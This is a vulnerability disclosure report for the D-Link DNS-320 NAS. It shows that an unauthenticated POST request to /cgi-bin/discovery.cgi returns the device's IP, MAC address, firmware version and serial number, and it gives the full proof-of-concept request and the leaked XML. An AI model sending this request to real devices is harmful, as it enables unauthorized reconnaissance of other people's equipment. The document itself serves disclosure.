# Info Leak in Dlink-DNS320 NAS

## Overview

    * Type: Information leak
    * Supplier: Dlink
    * Victim URL: http://{Device-IP}/cgi-bin/discovery.cgi
    * Product: ShareCenter™ 2-Bay Network Storage Enclosure DNS-320
    * Affect version: (lastest) 2.02b01
    * Firmware download: http://files.dlink.com.au/products/DNS-320/REV_A/Firmware/Firmware_v2.02b01/DNS-320_A1_FW_2.02b01.zip
 

## Description

An infomation leaking vulnerability is at the web management interface of the affected NAS devices. Without any permition, attacker can get sensitive information from the victim URL.

The victime url is a hidden interface and isn't been protected by any authentication and authorization.

## Business Impact

The leaked information is sensitive and could result in serious damage. Thus the vulnerability is very dangerous which could also result in reputational damage for the business through the impact on customers' trust.

## Steps to Reproduce

Visit the victime URL and sensitive information will be responded. Specifically, you can use burpsuite and send the following POST request packet to the device as the following PoC.
```
POST /cgi-bin/discovery.cgi HTTP/1.1
Host: 192.168.1.110
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.110
Referer: http://192.168.1.110/web/system_mgr/system.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: username=admin
Connection: close
Content-Length: 4

cmd=
```

Such sensitive information as 'IP address', 'Mac address', 'firmware version', 'Serial number' and other some configurations are explosed as below:
'''
<?xml version="1.0" encoding="utf-8" ?>
<entry>
<Model>DNS-320</Model>
<IP>192.168.1.110</IP>
<Mac>b8:a3:86:94:cb:d4</Mac>
<Name>RE5TLTMyNQ==</Name>
<Version>2.02b01</Version>
<DCPVersion>1.0.3</DCPVersion>
<Serial>12345678</Serial>
<NetworkStatus>Wired</NetworkStatus>
<ConnectType>Fixed</ConnectType>
</entry>
'''
